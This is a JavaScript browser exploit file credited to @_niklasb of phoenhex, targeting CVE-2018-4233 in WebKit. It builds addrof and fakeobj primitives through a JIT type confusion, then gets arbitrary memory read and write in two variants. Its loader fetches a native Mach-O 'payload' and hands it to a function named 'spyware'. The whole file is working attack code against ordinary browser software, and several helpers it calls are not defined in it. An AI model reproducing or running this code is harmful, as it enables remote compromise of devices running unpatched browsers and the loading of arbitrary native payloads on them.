/*
 * Exploit by @_niklasb from phoenhex.
 *
 * This exploit uses CVE-2018-4233 (by saelo) to get RCE in WebContent.
 */

ITERS = 10000
ALLOCS = 1000

var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)

var BASE32 = 0x100000000
function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
}

function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
}

function hexit(x) {
    if (x < 0)
        return `-${hex(-x)}`
    return `0x${x.toString(16)}`
}

function xor(a, b) {
    var res = 0, base = 1
    for (var i = 0; i < 64; ++i) {
        res += base * ((a&1) ^ (b&1))
        a = (a-(a&1))/2
        b = (b-(b&1))/2
        base *= 2
    }
    return res
}

// CVE-2018-4233
counter = 0
function trigger(constr, modify, res, val) {
    return eval(`
    var o = [13.37]
    var Constructor${counter} = function(o) { ${constr} }

    var hack = false

    var Wrapper = new Proxy(Constructor${counter}, {
        get: function() {
            if (hack) {
                ${modify}
            }
        }
    })

    for (var i = 0; i < ITERS; ++i)
        new Wrapper(o)

    hack = true
    var bar = new Wrapper(o)
    ${res}
    `)
}

function pwn(binary) {
    var stage1 = {
        addrof: function(victim) {
            return f2i(trigger('this.result = o[0]', 'o[0] = val', 'bar.result', victim))
        },

        fakeobj: function(addr) {
            return trigger('o[0] = val', 'o[0] = {}', 'o[0]', i2f(addr))
        },

        test: function() {
            var addr = this.addrof({a: 0x1337})
            var x = this.fakeobj(addr)
            if (x.a != 0x1337) {
                fail('webkit exploit failed: please reload the page or restart the app and wait a few seconds before retrying')
            }
        },
    }

    // Sanity check
    stage1.test()

    var memory = get_mem_old(stage1);

    var addrfake
    if (memory.hasOwnProperty('fakeobj') && memory.hasOwnProperty('addrof')) {
        addrfake = memory
    } else {
        addrfake = stage1
    }

    spyware(addrfake, memory, binary);
}


function get_mem_old(stage1) {
    // Pre spectre & pre gigacage
    var structs = [];
    function sprayStructures() {
        // The StructureIDTable can contain holes (these contain the index of the next free slot,
        // kind of like a freelist, just with indices). Since there could be a lot of free entries
        // in the table our spray must be somewhat large.
        function randomString() {
            return Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
        }
        for (var i = 0; i < 0x1000; i++) {
            var a = new Float64Array(1);
            // Add a new property to create a new Structure instance.
            a[randomString()] = 1337;
            structs.push(a);        // keep the Structure objects alive.
        }
    }

    // The plan is to
    // 0. Create a lot of Structures for Float64Array instances
    // 1. Setup a fake Float64Array inside another object's inline properties.
    //    The data pointer points into a Uint8Array.
    // 2. Since we don't know the correct structure ID of a Float64Array instance,
    //    we find it using 'instanceof'.
    // 3. We now have an arbitrary read+write primitive since we control the data pointer
    //    of an Uint8Array.
    // 4. We need to fix up a few things so the garbage collector won't crash the process.

    // Set up lot's of structures for Float64Array instances.
    sprayStructures();

    // Create the array that will be used to read and write arbitrary memory addresses.
    var hax = new Uint8Array(0x1000);

    // Create fake JSObject.
    // print("[*] Setting up container object");

    var jsCellHeader = new Int64([
        0, 0x10, 0, 0,          // m_structureID, current guess.
                                // JSC allocats a set of structures for non-JSObjects (Executables, regular expression objects, ...)
                                // during start up. Avoid these by picking a high initial ID.
        0x0,                    // m_indexingType, None
        0x27,                   // m_type, Float64Array (doesn't really matter, will be different for older versions)
        0x18,                   // m_flags, OverridesGetOwnPropertySlot | InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
        0x1                     // m_cellState, NewWhite
    ]);

    var container = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: false,       // Some arbitrary value, we'll fix this up at the end.
        vector: hax,
        lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()
    };

    // Create the fake Float64Array.
    var address = Add(stage1.addrof(container), 16);
    // print("[*] Fake JSObject @ " + address);

    var fakearray = stage1.fakeobj(address);

    // From now on until we've set the butterfly pointer to a sane value (i.e. nullptr)
    // a GC run would crash the process. Thus, operations performed now should be
    // as fast as possible.

    // Find a StructureID for a Float64Array instance.
    while (!(fakearray instanceof Float64Array)) {
        // Try to avoid heap allocations here, we don't want to trigger GC.
        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        container.jsCellHeader = jsCellHeader.asJSValue();
    }

    // Maybe shouldn't print stuff here.. :P
    // print("[*] Float64Array structure ID found: " + jsCellHeader.toString().substr(-8));

    //
    // We now have an arbitrary read+write primitive since we can overwrite the
    // data pointer of an Uint8Array with an arbitrary address.
    //
    // Optimization: force JIT compilation for these methods.
    //
    memory = {
        read: function(addr, length) {
            // print("[<] Reading " + length + " bytes from " + hexit(addr));
            fakearray[2] = i2f(addr);
            var a = new Array(length);
            for (var i = 0; i < length; i++)
                a[i] = hax[i];
            return a;
        },

        readInt64: function(addr) {
            return new Int64(this.read(addr, 8));
        },

        write: function(addr, data) {
            // print("[>] Writing " + data.length + " bytes to " + hexit(addr));
            fakearray[2] = i2f(addr);
            for (var i = 0; i < data.length; i++)
                hax[i] = data[i];
        },

        writeInt64: function(addr, val) {
            return this.write(addr, val.bytes());
        }
    };

    // Fixup the JSCell header of the container to make it look like an empty object.
    // By default, JSObjects have an inline capacity of 6, enough to hold the fake Float64Array.
    var empty = {};
    var header = memory.read(stage1.addrof(empty), 8);
    memory.write(stage1.addrof(container), header);

    // Copy the JSCell and Butterfly (will be nullptr) from an existing Float64Array.
    var f64array = new Float64Array(8);
    header = memory.read(stage1.addrof(f64array), 16);
    memory.write(stage1.addrof(fakearray), header);

    // Set valid flags as well: make it look like an OversizeTypedArray
    // for easy GC survival (see JSGenericTypedArrayView<Adaptor>::visitChildren).
    memory.write(Add(stage1.addrof(fakearray), 24), [0x10,0,0,0,1,0,0,0]);

    // Root the container object so it isn't garbage collected.
    // This will allocate a butterfly for the fake object and store a reference to the container there.
    // The fake array itself is rooted by the memory object (closures).
    fakearray.container = container;

    return memory
}

function get_mem_new(stage1) {
    // post spectre & gigacage compatible
    // however, memory rw is backed by normal js objects and not typed
    // arrays, and is less reliable

    // "normal" arrays store values in butterfly, and typed arrays store
    // their values in m_vector.
    // butterfly is not cached, but vector is -- so until gigacage is
    // killed old-style typed arrays can't be used for rw primitive

    // first property offset
    var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;

    var structure_spray = []
    for (var i = 0; i < 1000; ++i) {
        // last property is 0xfffffff because we want that value to
        // preceed the manager, so when manager gets reused as
        // butterfly, it's vectorLength is big enough
        var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff}
        ary['prop'+i] = 1
        structure_spray.push(ary)
    }

    var manager = structure_spray[500]
    var leak_addr = stage1.addrof(manager)
    //print('leaking from: '+ hex(leak_addr))

    // properties are stored in butterfly to the right of pointer
    // so when we create a fake object with butterfly pointing to
    // manager, we would be only able to access memory which lies after
    // the manager, since we can't reliably access properties: we don't
    // even know structure layout we'd end up using, see get_mem_old's
    // instanceof loop for more info
    function alloc_above_manager(expr) {
        var res
        do {
            for (var i = 0; i < ALLOCS; ++i) {
                structure_spray.push(eval(expr))
            }
            res = eval(expr)
        } while (stage1.addrof(res) < leak_addr)
        return res
    }

    var unboxed_size = 100

    // Two arrays are created: unboxed and boxed
    // their butterflies are then set to same value
    // so unboxed[i] would point to same memory as boxed[i]
    // this leads to easy type confusion:
    // JSValue (inc. pointers) with floats
    // see saelo's phrack article, look for "JSC defines a set of
    // different indexing types".
    // JSC sees huge array containing only floats, so they'd be stored
    // as floats and retrived as floats, not as normal JSValue's
    var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']')
    // this one would have indexing type of array with objects in it
    var boxed = alloc_above_manager('[{}]')
    var victim = alloc_above_manager('[]')

    // Will be stored out-of-line at butterfly - 0x10
    victim.p0 = 0x1337
    function victim_write(val) {
        victim.p0 = val
    }
    function victim_read() {
        return victim.p0
    }

    i32[0] = 0x200                // Structure ID
    i32[1] = 0x01082007 - 0x10000 // Fake JSCell metadata, adjusted for boxing
    var outer = {
        p0: 0, // Padding, so that the rest of inline properties are 16-byte aligned
        p1: f64[0],
        p2: manager,
        // parts of spectre mitigation, but just won't be used on older
        // versions
        p3: 0xfffffff, // Butterfly indexing mask
    }

    // this would cause p1 to be interpreted as an object
    // with p2==manager==leak_addr being used as butterfly
    var fake_addr = stage1.addrof(outer) + FPO + 0x8
    //print('fake obj @ ' + hex(fake_addr))

    var unboxed_addr = stage1.addrof(unboxed)
    var boxed_addr = stage1.addrof(boxed)
    var victim_addr = stage1.addrof(victim)
    //print('leak ' + hex(leak_addr)
        //+ '\nunboxed ' + hex(unboxed_addr)
        //+ '\nboxed ' + hex(boxed_addr)
        //+ '\nvictim ' + hex(victim_addr))

    var holder = {fake: {}}
    holder.fake = stage1.fakeobj(fake_addr)

    // From here on GC would be uncool

    // Share a butterfly for easier boxing/unboxing
    var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8])
    var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8]
    holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly)

    var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8]
    function set_victim_addr(where) {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10)
    }
    function reset_victim_addr() {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly
    }

    var stage2 = {
        addrof: function(victim) {
            boxed[0] = victim
            return f2i(unboxed[0])
        },

        fakeobj: function(addr) {
            unboxed[0] = (new Int64(addr)).asDouble()
            return boxed[0]
        },

        write64: function(where, what) {
            set_victim_addr(where)
            victim_write(this.fakeobj(what))
            reset_victim_addr()
        },

        read64: function(where) {
            set_victim_addr(where)
            var res = this.addrof(victim_read())
            reset_victim_addr()
            return res
        },

        writeInt64: function(where, what) {
            set_victim_addr(where)
            victim_write(this.fakeobj(f2i(what.asDouble())))
            reset_victim_addr()
        },

        readInt64: function(where) {
            set_victim_addr(where)
            var res = this.addrof(victim_read())
            reset_victim_addr()
            return new Int64(res)
        },

        read: function(addr, length) {
            var a = new Array(length);
            var i;

            for (i = 0; i + 8 < length; i += 8) {
                v = this.readInt64(addr + i).bytes()
                for (var j = 0; j < 8; j++) {
                    a[i+j] = v[j];
                }
            }

            v = this.readInt64(addr + i).bytes()
            for (var j = i; j < length; j++) {
                a[j] = v[j - i];
            }

            return a
        },

        write: function(addr, data) {
            throw 'maybe later'
        },
    }

    return stage2
}

function go()
{
    try
    {
        var req = new XMLHttpRequest();
        req.open('GET', 'payload');
        req.responseType = 'arraybuffer';
        req.addEventListener('load', function()
        {
            try
            {
                if(req.responseType != 'arraybuffer')
                {
                    throw 'y u no blob';
                }
                var arrayBuf = new Uint8Array(req.response);
                var header = b2u32(arrayBuf.slice(0, 4)); // sanity check on the header
                if(header != 0xfeedfacf)
                {
                    fail(`header is invalid: ${hexit(header)}, should be 0xfeedfacf\nwtf is your payload??`);
                    return;
                }
                pwn(arrayBuf);
            }
            catch(e)
            {
                fail('Error: ' + e + (e != null ? '\n' + e.stack : ''));
            }
        });
        req.addEventListener('error', function(ev)
        {
            fail(ev);
        });
        req.send();
    }
    catch(e)
    {
        fail('Error: ' + e + (e != null ? '\n' + e.stack : ''));
    }
}
